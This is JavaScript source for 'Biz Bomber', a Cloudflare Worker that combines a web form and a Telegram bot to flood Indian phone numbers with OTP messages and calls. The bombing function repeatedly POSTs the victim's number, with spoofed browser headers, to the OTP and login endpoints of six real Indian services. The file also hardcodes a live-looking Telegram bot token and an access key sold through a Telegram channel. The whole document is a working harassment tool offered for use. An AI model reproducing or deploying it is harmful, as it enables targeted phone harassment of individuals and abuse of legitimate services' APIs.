addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // Handle Telegram webhook requests
  if (url.pathname === '/telegram-webhook') {
    const body = await request.json();
    return await handleTelegramRequest(body);
  }

  // Serve the HTML form if no submit or stop action
  if (url.searchParams.get('submit') === null && url.searchParams.get('stop') === null) {
    return new Response(getHTMLForm(), {
      headers: { 'Content-Type': 'text/html' },
    });
  }

  // Handle stop action
  if (url.searchParams.get('stop') === 'true') {
    return new Response(
      `<script>alert("Bombing stopped!"); window.location.href = "/";</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  // Handle web form submission
  const number = url.searchParams.get('number');
  const countNumber = parseInt(url.searchParams.get('countnumber'), 10);
  const key = url.searchParams.get('key');
  const validKey = '200233';

  if (key !== validKey) {
    return new Response(
      `<script>alert("Enter valid key"); window.location.href = "/";</script>`,
      { headers: { 'Content-Type': 'text/html' } }
    );
  }

  const fullNumber = `+91${number}`;
  const bombResponse = await startBombing(fullNumber, countNumber);

  return new Response(bombResponse, {
    headers: { 'Content-Type': 'text/html' },
  });
}

// Handle Telegram bot requests
async function handleTelegramRequest(body) {
  const TELEGRAM_API_TOKEN = '7286429810:AAFBRan5i76hT2tlbxzpjFYwJKRQhLh5kPY'; // Replace with your bot token
  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_API_TOKEN}`;

  const chatId = body.message?.chat?.id;
  const text = body.message?.text;

  if (!chatId || !text) {
    return new Response('OK', { status: 200 });
  }

  if (text === '/start') {
    const message = 'Welcome to Biz Bomber! Use /sendnumber to send a phone number.';
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } else if (text === '/sendnumber') {
    const message = 'Please send the 10-digit phone number you want to bomb.';
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } else if (/^\d{10}$/.test(text)) { // Check if the message is a 10-digit number
    const fullNumber = `+91${text}`;
    const message = `Number received: ${fullNumber}. Press "Send OTP" to start bombing.`;
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        reply_markup: {
          inline_keyboard: [[
            { text: 'Send OTP', callback_data: `bomb:${fullNumber}` }
          ]],
        },
      }),
    });
  } else if (body.callback_query) { // Handle button press
    const callbackData = body.callback_query.data;
    const callbackChatId = body.callback_query.message.chat.id;

    if (callbackData.startsWith('bomb:')) {
      const number = callbackData.split(':')[1];
      const countNumber = 50; // Default count, adjust as needed
      const bombResult = await startBombing(number, countNumber);

      await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callbackChatId,
          text: `Bombing started on ${number}. Calls sent: ${bombResult.count}`,
        }),
      });
    }
  }

  return new Response('OK', { status: 200 });
}

// HTML form with +91 design
function getHTMLForm() {
  return `
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="title" content="SMS + CALL BOMBER" />
        <meta name="description" content="Best SMS+Call Bomber Service in the World" />
        <meta name="keywords" content="SMS BOMBER, CALL BOMBER, 2023" />
        <meta name="author" content="JOIN @DEVSMK ON TELEGRAM" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.css" />
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" />
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
        <title>BIZ BOMBER - @DEVSMK</title>
        <style>
          * { margin: 0; padding: 0; overflow: hidden; text-align: center; }
          body { background: #333; color: #fff; font-family: "Courier", monospace; }
          .heading { display: flex; margin: 50px auto; height: 100px; justify-content: center; align-items: center; }
          .heading h2 { font-size: 36px; }
          .form { display: flex; flex-direction: column; justify-content: center; align-items: center; }
          .forminput { font-size: 20px; text-align: center; border-radius: 23px; margin: 13px; padding: 10px 10px 10px 50px; width: 250px; background: #444; color: #fff; border: none; }
          .btns { background: #0D6EFD; border: 0; border-radius: 23px; color: white; text-transform: uppercase; cursor: pointer; margin: 10px auto; padding: 10px 20px; font-size: 25px; }
          .btns:hover { background: #000; }
          .bomb-start { display: flex; padding: 10px; justify-content: center; font-size: 20px; }
          .bomb-count { display: flex; justify-content: center; color: red; padding: 10px; font-size: 18px; }
          #stop-btn { display: inline-block; background: #ff4444; border-radius: 23px; font-size: 18px; text-transform: uppercase; color: #fff; text-decoration: none; padding: 15px 25px; margin-top: 15px; }
          .input-wrapper { position: relative; display: inline-block; }
          .country-code { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 20px; pointer-events: none; }
          input::-webkit-outer-spin-button,
          input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
          input[type=number] { -moz-appearance: textfield; }
        </style>
      </head>
      <body>
        <div class="heading">
          <h2>BIZ BOMBER</h2>
        </div>
        <div class="form">
          <form action="/" method="GET">
            <div class="input-wrapper">
              <span class="country-code">+91</span>
              <input class="forminput" type="number" name="number" placeholder="Enter Number" required />
            </div>
            <input class="forminput" type="number" max="100" name="countnumber" value="50" placeholder="Enter No. Of Calls" required />
            <input class="forminput" type="text" name="key" placeholder="Enter Access key" required />
            <a style="background-color: red;" class="btn btn-primary fw-bold p-2" href="//t.me/devsmk">Get key<i class="fa fa-telegram"></i></a>
            <input class="btns" type="submit" value="submit" name="submit" />
          </form>
        </div>
      </body>
    </html>
  `;
}

// Bombing logic with multiple API endpoints
async function startBombing(number, countNumber) {
  let currentCount = 0;

  const bombEndpoints = [
    {
      url: 'https://www.medibuddy.in/unified-login/user/register',
      data: JSON.stringify({ phonenumber: number }),
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    },
    {
      url: 'https://api.krishify.com/api/v1/auth/phone-login/generate',
      data: JSON.stringify({ phone_number: number, name: 'Tetu Mama' }),
      headers: {
        'Host': 'api.krishify.com',
        'Content-Length': '48',
        'Accept-Language': 'hi',
        'App-Name': 'KRISHIFY-DEALS',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'App-Version-Code': '320',
        'Origin': 'https://deals.krishify.com',
        'Referer': 'https://deals.krishify.com/',
        'Accept-Encoding': 'gzip, deflate, br',
      },
    },
    {
      url: 'https://www.dealshare.in/api/1.0/get-otp',
      data: JSON.stringify({ phoneNumber: number }),
      headers: {
        'Host': 'www.dealshare.in',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36',
        'Origin': 'https://www.dealshare.in',
        'Referer': 'https://www.dealshare.in/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    },
    {
      url: 'https://www.decathlon.in/api/login/sendotp',
      data: JSON.stringify({ param: number, source: 1 }),
      headers: {
        'Host': 'www.decathlon.in',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
        'Origin': 'https://www.decathlon.in',
        'Referer': 'https://www.decathlon.in/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    },
    {
      url: `https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber=${number}`,
      data: `mobileNumber=${number}`,
      headers: {
        'Host': 'ullu.app',
        'Content-Length': '0',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://ullu.app',
        'Referer': 'https://ullu.app/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    },
    {
      url: 'https://api.tatadigital.com/api/v2/sso/check-phone',
      data: JSON.stringify({ countryCode: '91', phone: number, sendOtp: true }),
      headers: {
        'Host': 'api.tatadigital.com',
        'Content-Length': '56',
        'Accept': '*/*',
        'Client_Id': 'WESTSIDE-WEB-APP',
        'Content-Type': 'application/json',
        'Origin': 'https://www.westside.com',
        'Referer': 'https://www.westside.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    },
  ];

  for (let i = 0; i < countNumber; i++) {
    for (const endpoint of bombEndpoints) {
      try {
        await fetch(endpoint.url, {
          method: 'POST',
          headers: endpoint.headers,
          body: endpoint.data,
        });
        currentCount++;
        await new Promise(resolve => setTimeout(resolve, 100)); // Throttle
      } catch (error) {
        console.error(`Error with ${endpoint.url}: ${error}`);
      }
    }
  }

  return { html: `
    <span class='bomb-start'>Bombing Started On This No.: ${number}</span>
    <span class='bomb-count'>Calls Sent: ${currentCount}</span>
    <a href='/?stop=true' id='stop-btn'>Stop Bombing</a>
  `, count: currentCount };
}
